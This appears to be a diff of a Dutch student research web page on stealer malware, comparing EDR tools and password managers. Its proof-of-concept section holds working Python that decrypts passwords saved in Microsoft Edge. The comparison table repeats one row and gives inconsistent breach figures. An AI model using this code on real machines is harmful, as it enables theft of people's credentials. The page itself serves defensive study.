-                                <td>Nieuwere, lokaal (NL) gevestigde speler met focus op AVG/BIO/NIS2 compliance en gebruiksgemak.</td>
-                            </tr>
-                            <tr>
-                                <td><strong>Bitwarden</strong></td>
-                                <td>AES-256, MFA, Toegangsbeheer, Rollen</td>
-                                <td>Ja</td>
-                                <td>Ja, SSO (beperkt)</td>
-                                <td>Maximale training voor minder IT-vaardige gebruikers.</td>
-                                <td>€6.00</td>
-                                <td>3x in een dag (een geconstateerde, snelle reactie)</td>
-                                <td>Open-source optie met veel aanpasbaarheid, maar kan complexer zijn voor grootschalige implementatie.</td>
-                            </tr>
-                            <tr>
-                                <td><strong>NordPass</strong></td>
-                                <td>AES-256, MFA, Toegangsbeheer, Rollen</td>
-                                <td>Ja</td>
-                                <td>Ja, SSO</td>
-                                <td>Minimale training</td>
-                                <td>€6.00</td>
-                                <td>0</td>
-                                <td>Onderdeel van het Nord-beveiligingsecosysteem (NordVPN, NordLocker); sterke focus op privacy.</td>
-                            </tr>
-                        </tbody>
-                    </table>
-                </div>
-                <img src="images/password_manager_compare.png" alt="Vergelijkingstabel van wachtwoordmanagers of iconen van de besproken managers" class="section-image">
-                <p>Uit deze analyse komen MindYourPass en NordPass naar voren als sterke kandidaten. Ze blinken uit in beveiliging, voldoen aan relevante regelgeving (AVG, BIO, NIS2), bieden goede integratiemogelijkheden en zijn gebruiksvriendelijk. De keuze hangt vaak af van specifieke organisatorische behoeften en voorkeuren (bijv. lokale support).</p>
-            </section>
-
-            <section>
-                <h2>Incident Response: Een Proactieve Aanpak bij een Breach</h2>
-                <p>Zelfs met de beste preventie en detectie kan een incident optreden. Een goed gestructureerd en geoefend <strong>Incident Response (IR) team</strong> is dan van onschatbare waarde. Hier zijn de sleutelfuncties binnen een modern IR-team:</p>
-                <ul>
-                    <li><strong>SOC-Analist (Security Operations Center):</strong> De frontlinie van de verdediging. Zij monitoren continue logbestanden, netwerkverkeer en endpoint alerts. Hun taak is om verdachte activiteiten te identificeren, te triageren en, indien nodig, door te escaleren naar de Incident Responders.</li>
-                    <li><strong>Incident Responder:</strong> Deze experts coördineren de reactie op beveiligingsincidenten. Ze isoleren getroffen systemen, voeren forensische analyses uit om de omvang en oorzaak van de inbreuk vast te stellen, en werken aan herstel. Ze zijn cruciaal voor het beperken van schade en het snel herstellen van de normale bedrijfsvoering.</li>
-                    <li><strong>Threat Intelligence Analyst:</strong> Verzamelt, analyseert en interpreteert dreigingsinformatie uit diverse bronnen (bijv. dark web, open-source intelligence, malware-analyse rapporten). Deze informatie wordt gebruikt om proactief verdedigingsstrategieën te versterken en potentiële toekomstige aanvallen te anticiperen.</li>
-                    <li><strong>Security Engineer:</strong> Ontwerpt, implementeert en onderhoudt beveiligingsoplossingen zoals firewalls, Intrusion Prevention Systems (IPS), EDR-oplossingen, en SIEM-systemen. Ze zorgen ervoor dat de infrastructuur veerkrachtig is tegen aanvallen.</li>
-                    <li><strong>Compliance & Risk Manager:</strong> Zorgt ervoor dat de organisatie voldoet aan relevante wet- en regelgeving (AVG, NIS2, ISO 27001). Zij identificeren potentiële risico's, implementeren risicobeheerprocessen en zorgen voor de juiste rapportage bij datalekken.</li>
-                </ul>
-                <img src="images/incident_response_team.png" alt="Illustratie van een cyberbeveiligingsincident response team" class="section-image">
-                <p>Deze functies zijn onderling verbonden en cruciaal voor een robuuste, proactieve beveiligingsaanpak die niet alleen detecteert en reageert, maar ook leert van incidenten om toekomstige dreigingen beter te voorkomen.</p>
-            </section>
-        </article>
-    </main>
-
-    <footer>
+    <!-- Hero Section -->
+    <section class="hero">
         <div class="container">
-            <p><strong>Conclusie:</strong> Stealer malware blijft een significante bedreiging in de cyberveiligheid. Door middel van een diepgaande analyse, inclusief een proof-of-concept, is duidelijk geworden hoe deze malware opereert door slim gebruik te maken van systeemeigen functionaliteiten. Effectieve verdediging vereist een gelaagde aanpak: geavanceerde EDR-oplossingen voor detectie, proactieve preventieve maatregelen zoals robuuste wachtwoordmanagers, en een goed geoefend incident response team. Alleen door deze elementen te combineren, kunnen organisaties hun digitale activa effectief beschermen en de veerkracht tegen evoluerende cyberdreigingen vergroten.</p>
-            <p class="small-text">Alle informatie is gebaseerd op onderzoek en analyse, met bronnen die de basis vormen voor de gepresenteerde inzichten.</p>
+            <h1>Stealer Malware Research</h1>
+            <p>Een diepgaand onderzoek naar detectie, preventie en incident response strategieën tegen credential harvesting malware</p>
+            
+            <div class="author-info">
+                <div class="author-avatar">TS</div>
+                <div class="author-details">
+                    <h3>Timo van der Steen</h3>
+                    <p>Specialisatie Research • Semester 6 • 19/03/2024</p>
+                </div>
+            </div>
+
+            <div>
+                <span class="tech-badge">Malware Analysis</span>
+                <span class="tech-badge">Cybersecurity</span>
+                <span class="tech-badge">EDR Solutions</span>
+                <span class="tech-badge">Blue Team</span>
+            </div>
         </div>
-    </footer>
-</body>
-</html>
+    </section>
+
+    <!-- Main Content -->
+    <main class="main-content">
+        <div class="container">
+            <div class="content-grid">
+                <!-- Table of Contents -->
+                <aside class="toc">
+                    <h3>Inhoudsopgave</h3>
+                    <ul>
+                        <li><a href="#onderzoek">Onderzoeksvragen</a></li>
+                        <li><a href="#patronen">Malware Patronen</a></li>
+                        <li><a href="#poc">Proof of Concept</a></li>
+                        <li><a href="#obfuscatie">Obfuscatie & Encryptie</a></li>
+                        <li><a href="#detectie">Detectiemethoden</a></li>
+                        <li><a href="#preventie">Wachtwoord Managers</a></li>
+                        <li><a href="#conclusie">Conclusie</a></li>
+                    </ul>
+                </aside>
+
+                <!-- Article Content -->
+                <article class="article">
+                    <!-- Orientatie Section -->
+    
+                   
+                    <!-- Onderzoeksvragen Section -->
+                    <section id="onderzoek" class="section">
+                        <h2>Onderzoeksvragen</h2>
+                        
+                        <div class="warning-box">
+                            <strong>Hoofdvraag:</strong> Hoe kunnen organisaties zich beschermen tegen stealer malware door middel van detectie, preventie en incident response?
+                        </div>
+
+                        <h3>Deelvragen & DOT-classificatie</h3>
+<ul>
+                            <li><strong>Welke patronen zijn herkenbaar in bestaande stealer malware?</strong><br>
+                                Door bestaande malware-samples te analyseren kunnen we terugkerende gedragingen identificeren, zoals specifieke doelwitten (browsers, crypto wallets), gebruikte technieken (DPAPI-misbruik, fileless execution) en exfiltratiemethoden. Dit helpt bij het ontwikkelen van effectieve detectieregels.<br>
+                                <em>DOT: Field - Analyses van bestaande malware</em></li>
+                            
+                            <li><strong>Hoe werkt stealer malware en welke exfiltratie-technieken worden gebruikt?</strong><br>
+                                Door zelf een proof-of-concept te ontwikkelen krijgen we hands-on inzicht in hoe stealers precies te werk gaan: van het kraken van browser-encryptie tot het versturen van gestolen data naar command & control servers. Dit praktische onderzoek toont de technische complexiteit en kwetsbaarheden.<br>
+                                <em>DOT: Lab - POC/Computer simulation</em></li>
+                            
+                            <li><strong>Hoe kunnen obfuscatie- en encryptietechnieken worden gedetecteerd?</strong><br>
+                                Moderne malware gebruikt geavanceerde verbergingstechnieken om detectie te ontwijken. Door statische en dynamische analysemethoden te onderzoeken, kunnen we vaststellen welke tools en technieken het meest effectief zijn voor het doorprikken van deze verdedigingsmechanismen.<br>
+                                <em>DOT: Field - Code review & analyses</em></li>
+                            
+                            <li><strong>Welke detectiemethoden zijn effectief voor vroege identificatie?</strong><br>
+                                Een vergelijkend onderzoek van verschillende EDR-oplossingen (Microsoft Defender, CrowdStrike, SentinelOne) om te bepalen welke systemen het beste presteren in het herkennen van stealer-activiteiten voordat schade ontstaat. Focus ligt op real-time monitoring en gedragsanalyse.<br>
+                                <em>DOT: Showroom - Vergelijking van EDR-oplossingen</em></li>
+                            
+                            <li><strong>Welke wachtwoordmanagers bieden goede preventieve bescherming?</strong><br>
+                                Aangezien stealers primair gericht zijn op het onderscheppen van wachtwoorden uit browsers, onderzoeken we welke password managers de beste bescherming bieden. Criteria omvatten beveiliging, gebruiksvriendelijkheid, compliance (AVG/NIS2) en track record wat betreft data breaches.<br>
+                                <em>DOT: Showroom - Vergelijking van password managers</em></li>
+                        </ul>
+                    </section>
+
+                    <!-- Patronen Section -->
+                    <section id="patronen" class="section">
+                        <h2>Patronen in Stealer Malware</h2>
+                        
+                        <p>Uit analyse van bestaande stealer-malware zijn verschillende terugkerende patronen en kenmerken te herkennen:</p>
+
+                        <h3>1. Living off the Land Technieken</h3>
+                        <p>Veel stealers maken gebruik van bestaande Windows-componenten zoals PowerShell, cmd.exe, of MSHTA.exe om detectie te ontwijken zonder extra bestanden te downloaden.</p>
+
+                        <h3>2. Exfiltratie via Standaardprotocollen</h3>
+<ul>
+    <li><strong>HTTP(S)-verkeer naar command & control servers:</strong><br>
+        De malware stuurt gestolen gegevens via een standaard HTTP POST-request. Bij gebruik van HTTPS is de inhoud versleuteld, waardoor firewalls niet kunnen zien wat er wordt verzonden.
+    </li>
+    <li><strong>Telegram bots via API calls:</strong><br>
+        De malware maakt verbinding met een Telegram-bot en stuurt de data naar een privéchat of groep. De aanvaller krijgt zo direct meldingen met de gestolen informatie.
+    </li>
+    <li><strong>Discord webhooks:</strong><br>
+        Stealers gebruiken webhooks om berichten (inclusief bestanden of screenshots) te posten in een Discord-kanaal. Dit werkt snel en anoniem.
+    </li>
+    <li><strong>FTP/SFTP-verbindingen:</strong><br>
+        Oudere maar nog steeds gebruikte methode waarbij data via file transfer protocols naar een server van de aanvaller wordt geüpload.
+    </li>
+</ul>
+
+
+                        <h3>3. Specifieke Doelwitten</h3>
+                        <div class="code-block">
+                            Target Applications:
+                            • Browsers: Chrome, Firefox, Edge (wachtwoorden, cookies, autofill)
+                            • VPN/RDP: OpenVPN, AnyDesk, TeamViewer
+                            • Crypto wallets: Metamask, Exodus, browser extensions
+                            • Gaming: Steam, Epic Games (accounts en sessies)
+                        </div>
+
+                        <h3>4. Minimalistische Werking</h3>
+                        <p>Veel stealers zijn <strong>fileless</strong> of bestaan uit één uitvoerbaar bestand. Ze draaien snel, verzamelen data in seconden en verwijderen zichzelf daarna via self-delete of scheduled task cleanup.</p>
+
+                        <div class="info-box">
+                            <strong>As-a-Service Model:</strong> Er zijn veel commerciële stealers zoals Raccoon Stealer, RedLine, Vidar, en Lumma, waarbij gebruikers tegen betaling een gepersonaliseerde stealer krijgen inclusief C2-paneel en support.
+                        </div>
+                    </section>
+
+                    <!-- POC Section -->
+<section id="poc" class="section">
+    <h2>Proof of Concept: Edge Password Stealer</h2>
+    
+    <p>Voor mijn hands-on onderzoek heb ik een proof-of-concept ontwikkeld die demonstreert hoe stealer malware wachtwoorden uit Microsoft Edge kan ophalen:</p>
+
+    <h3>Stap 1: Encryptie-sleutel Ophalen</h3>
+    <p>Microsoft Edge slaat wachtwoorden versleuteld op met een speciale sleutel in het "Local State" bestand. Deze sleutel wordt ontsleuteld via Windows DPAPI (CryptUnprotectData).</p>
+    
+    <div class="code-block">
+<pre>def get_encryption_key():
+    """Haal de encryptiesleutel op uit de Local State file"""
+    local_state_path = os.path.join(os.environ["USERPROFILE"],
+                                    "AppData", "Local", "Microsoft", "Edge",
+                                    "User Data", "Local State")
+    
+    with open(local_state_path, "r", encoding="utf-8") as f:
+        local_state = f.read()
+        local_state = json.loads(local_state)
+
+    # Haal de versleutelde key op uit de Local State
+    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+    # Verwijder DPAPI string prefix
+    key = key[5:]
+    # Decrypt de key met Windows DPAPI
+    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]</pre>
+    </div>
+
+    <h3>Stap 2: Database Kopiëren</h3>
+    <p>Wachtwoorden staan in een SQLite-database "Login Data". Het script maakt eerst een kopie om toegangsfouten te voorkomen omdat Edge de database mogelijk heeft vergrendeld.</p>
+    
+    <div class="code-block">
+<pre># Database pad bepalen en kopie maken
+login_db_path = os.path.join(os.environ["USERPROFILE"],
+                         "AppData", "Local", "Microsoft", "Edge",
+                         "User Data", "Default", "Login Data")
+
+# Maak een kopie omdat database mogelijk locked is
+temp_login_db = "edge_login_data_temp.db"
+shutil.copy2(login_db_path, temp_login_db)
+
+conn = sqlite3.connect(temp_login_db)
+cursor = conn.cursor()
+cursor.execute("SELECT origin_url, username_value, password_value FROM logins")</pre>
+    </div>
+
+    <h3>Stap 3: AES-GCM Decryptie</h3>
+    <p>De eigenlijke decryptie gebeurt met AES in GCM-modus. Elke versleutelde wachtwoord bevat een initialisatievector (IV) gevolgd door de versleutelde data:</p>
+    
+    <div class="code-block">
+<pre>def decrypt_password(password, key):
+    """Decodeer de versleutelde wachtwoorden"""
+    try:
+        # Haal de initialisatie vector op (bytes 3-15)
+        iv = password[3:15]
+        password = password[15:]
+        # Genereer cipher met AES-GCM
+        cipher = AES.new(key, AES.MODE_GCM, iv)
+        # Decrypt wachtwoord en verwijder authentication tag (laatste 16 bytes)
+        return cipher.decrypt(password)[:-16].decode()
+    except:
+        try:
+            # Fallback voor oudere encryptie (DPAPI alleen)
+            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
+        except:
+            return "Decryptie mislukt"</pre>
+    </div>
+
+    <h3>Technische Details</h3>
+<ul>
+    <li><strong>DPAPI (Data Protection API):</strong><br>
+        Windows-functie waarmee gebruikersdata (zoals wachtwoorden) veilig wordt versleuteld en alleen door dezelfde gebruiker op datzelfde systeem kan worden ontsleuteld.
+    </li>
+    <li><strong>AES-GCM:</strong><br>
+        Een moderne versleutelingstechniek die naast vertrouwelijkheid ook de integriteit van gegevens waarborgt. Wordt gebruikt om de daadwerkelijke wachtwoorden te ontsleutelen.
+    </li>
+    <li><strong>Base64 Encoding:</strong><br>
+        Een methode om binaire data (zoals een encryptiesleutel) leesbaar op te slaan in een tekstformaat, vaak in JSON-bestanden.
+    </li>
+    <li><strong>SQLite Database:</strong><br>
+        Een kleine lokale database waarin Edge wachtwoorden en andere gebruikersdata opslaat. Het script maakt een kopie hiervan om toegang te krijgen zonder conflicten met het browserproces.
+    </li>
+</ul>
+
+
+    <div class="warning-box">
+        <strong>Ethische Disclaimer:</strong> Deze POC is uitsluitend gemaakt voor educatieve doeleinden en beveiligingsonderzoek. De code toont wachtwoorden alleen lokaal via print-statements en verstuurt geen data naar externe servers. In echte malware zou deze data worden geëxfiltreerd naar C2-servers via HTTP POST, Telegram bots, of Discord webhooks.
+        
+        <br><br><strong>Benodigde libraries:</strong>
+        <ul style="margin-top: 10px;">
+            <li>pycryptodome (voor AES decryptie)</li>
+            <li>pywin32 (voor Windows DPAPI calls)</li>
+            <li>sqlite3 (ingebouwd in Python)</li>
+        </ul>
+    </div>
+</section>
+
+                    <!-- Obfuscatie Section -->
+                    <section id="obfuscatie" class="section">
+                        <h2>Detectie van Obfuscatie & Encryptie</h2>
+                        
+                        <p>Moderne stealer malware gebruikt geavanceerde technieken om detectie te ontwijken:</p>
+
+                        <h3>Wat zijn Obfuscatie en Encryptie?</h3>
+                        <ul>
+                            <li><strong>Obfuscatie:</strong> Code wordt expres onduidelijk gemaakt met rare variabelennamen, onnodige code, en verborgen functies</li>
+                            <li><strong>Encryptie:</strong> Gestolen data en soms de malware zelf wordt versleuteld voor transport en opslag</li>
+                        </ul>
+
+                        <h3>Detectiemethoden</h3>
+                        
+                        <h4>Statische Analyse</h4>
+                        <p>Code-analyse zonder uitvoering met tools zoals Ghidra of dnSpy. Zoeken naar:</p>
+                        <ul>
+                            <li>AES-encryptie implementaties</li>
+                            <li>Base64-decodering</li>
+                            <li>Windows DPAPI-aanroepen</li>
+                            <li>Suspicious API calls</li>
+                        </ul>
+
+                        <h4>Dynamische Analyse</h4>
+                        <p>Malware uitvoeren in veilige testomgeving (sandbox) en observeren:</p>
+                        <ul>
+                            <li>Toegang tot gevoelige bestanden</li>
+                            <li>Verdachte netwerkverbindingen</li>
+                            <li>Memory-based decryptie</li>
+                            <li>Process injection technieken</li>
+                        </ul>
+
+                        <div class="info-box">
+                            <strong>Detection Tools:</strong> YARA-regels voor patroonherkenning, memory-analyse tools, gedragsanalyse via EDR-systemen, en netwerkmonitoring voor anomaliedetectie.
+                        </div>
+                    </section>
+
+                    <!-- Detectie Section -->
+                    <section id="detectie" class="section">
+                        <h2>EDR-oplossingen voor Stealer Detectie</h2>
+                        
+                        <p>Vergelijking van verschillende Endpoint Detection and Response oplossingen:</p>
+
+                        <table class="data-table">
+                            <thead>
+                                <tr>
+                                    <th>EDR-oplossing</th>
+                                    <th>Sterke punten</th>
+                                    <th>Aandachtspunten</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td><strong>Microsoft Defender for Endpoint</strong></td>
+                                    <td>• Strakke Windows/AD integratie<br>• DPAPI misbruik detectie<br>• Goede M365 logging</td>
+                                    <td>• Beperkt op non-Windows endpoints</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>CrowdStrike Falcon</strong></td>
+                                    <td>• Cloud-based gedragsanalyse<br>• Script-based malware detectie<br>• Lichtgewicht agent</td>
+                                    <td>• Black box AI beslissingen<br>• Minder transparantie</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>SentinelOne</strong></td>
+                                    <td>• Autonome AI detectie<br>• Automatische rollback<br>• Anomalie herkenning</td>
+                                    <td>• Mogelijk false positives<br>• Custom script interferentie</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>Sophos Intercept X</strong></td>
+                                    <td>• Signature + gedragstechnieken<br>• API-aanroep monitoring<br>• MKB-vriendelijk</td>
+                                    <td>• Beperkte threat hunting<br>• XDR-extensie nodig</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>Bitdefender GravityZone</strong></td>
+                                    <td>• Sterke sandboxing<br>• Credential store detectie<br>• Browserdata monitoring</td>
+                                    <td>• Complexe UI<br>• Steile leercurve</td>
+                                </tr>
+                            </tbody>
+                        </table>
+
+                        <h3>Aanbevelingen per Organisatietype</h3>
+                        <ul>
+                            <li><strong>Microsoft Defender:</strong> Ideaal voor volledig Windows-ecosysteem</li>
+                            <li><strong>CrowdStrike:</strong> Beste keuze voor grote organisaties met cloud-first benadering</li>
+                            <li><strong>SentinelOne:</strong> Sterk voor autonome detectie en automatische response</li>
+                            <li><strong>Sophos:</strong> Toegankelijk voor MKB en onderwijsinstellingen</li>
+                            <li><strong>Bitdefender:</strong> Krachtige technische detectie voor security-experts</li>
+                        </ul>
+                    </section>
+
+                    <!-- Preventie Section -->
+                    <section id="preventie" class="section">
+                        <h2>Wachtwoordmanagers als Preventieve Maatregel</h2>
+                        
+                        <p>Evaluatie van wachtwoordmanagers op basis van beveiliging, compliance (AVG/NIS2), integratie, gebruiksvriendelijkheid en betrouwbaarheid:</p>
+
+                        <table class="data-table">
+                            <thead>
+                                <tr>
+                                    <th>Password Manager</th>
+                                    <th>Beveiliging</th>
+                                    <th>Prijs (PM)</th>
+                                    <th>Breaches</th>
+                                    <th>Opmerkingen</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td><strong>LastPass Business</strong></td>
+                                    <td>AES-256, MFA, Toegangsbeheer</td>
+                                    <td>€5.20</td>
+                                    <td>2 breaches</td>
+                                    <td>Minimale training vereist</td>
+                                </tr>
+                                                                <tr>
+                                    <td><strong>LastPass Business</strong></td>
+                                    <td>AES-256, MFA, Toegangsbeheer</td>
+                                    <td>€5.20</td>
+                                    <td>2 breaches</td>
+                                    <td>Minimale training vereist</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>1Password Business</strong></td>
+                                    <td>AES-256, MFA, Toegangsbeheer</td>
+                                    <td>€7.99</td>
+                                    <td>0 breaches</td>
+                                    <td>Standaard training vereist</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>Keeper Security</strong></td>
+                                    <td>AES-256, MFA, Toegangsbeheer</td>
+                                    <td>€2.99</td>
+                                    <td>0 breaches</td>
+                                    <td>Voor kleine bedrijven ontworpen</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>MindYourPass</strong></td>
+                                    <td>AES-256, MFA, Rollen</td>
+                                    <td>€5.50</td>
+                                    <td>0 breaches</td>
+                                    <td>Lokale aanbieder Eindhoven</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>Bitwarden</strong></td>
+                                    <td>AES-256, MFA, Rollen</td>
+                                    <td>€6.00</td>
+                                    <td>3 breaches</td>
+                                    <td>Open source, meer training nodig</td>
+                                </tr>
+<tr>
+                                    <td><strong>NordPass</strong></td>
+                                    <td>AES-256, MFA, Rollen</td>
+                                    <td>€6.00</td>
+                                    <td>0 breaches</td>
+                                    <td>Gebruiksvriendelijk interface</td>
+                                </tr>
+                            </tbody>
+                        </table>
+
+                        <div class="info-box">
+                            <strong>Winnaar:</strong> Na uitgebreide evaluatie blijkt <strong>MindYourPass</strong> de beste keuze voor gemeentelijke organisaties. De lokale aanwezigheid in Eindhoven zorgt voor directe ondersteuning, terwijl de robuuste beveiliging en AVG/NIS2-compliance alle vereisten dekken.
+                        </div>
+                    </section>
+
+                    <!-- Conclusie Section -->
+                    <section id="conclusie" class="section">
+                        <h2>Conclusie & Aanbevelingen</h2>
+                        
+                        <p>Stealer malware vormt een groeiende bedreiging die organisaties niet mogen onderschatten. Dit onderzoek toont aan dat een <strong>gelaagde beveiligingsaanpak</strong> essentieel is voor effectieve bescherming:</p>
+
+                        <h3>Belangrijkste Bevindingen</h3>
+                        <ul>
+                            <li><strong>Detectie:</strong> Moderne EDR-oplossingen zoals CrowdStrike en SentinelOne bieden geavanceerde gedragsanalyse</li>
+                            <li><strong>Preventie:</strong> Wachtwoordmanagers elimineren het grootste doelwit van stealers - opgeslagen browserwachtwoorden</li>
+                            <li><strong>Response:</strong> Snelle incident response beperkt de schade van succesvolle aanvallen</li>
+                        </ul>
+
+                        <h3>Praktische Aanbevelingen</h3>
+                        <div class="warning-box">
+                            <strong>Actiepunten voor organisaties:</strong>
+                            <ul>
+                                <li>Implementeer een EDR-oplossing die past bij je omgeving</li>
+                                <li>Rol een centraal beheerde wachtwoordmanager uit</li>
+                                <li>Train medewerkers in phishing-herkenning</li>
+                                <li>Ontwikkel een incident response plan specifiek voor credential theft</li>
+                                <li>Monitor regelmatig op IOCs (Indicators of Compromise)</li>
+                            </ul>
+                        </div>
+
+                        <p>De cybersecurity-wereld evolueert snel, maar met de juiste combinatie van technologie, processen en bewustwording kunnen organisaties zich effectief beschermen tegen stealer malware en vergelijkbare dreigingen.</p>
+                    </section>
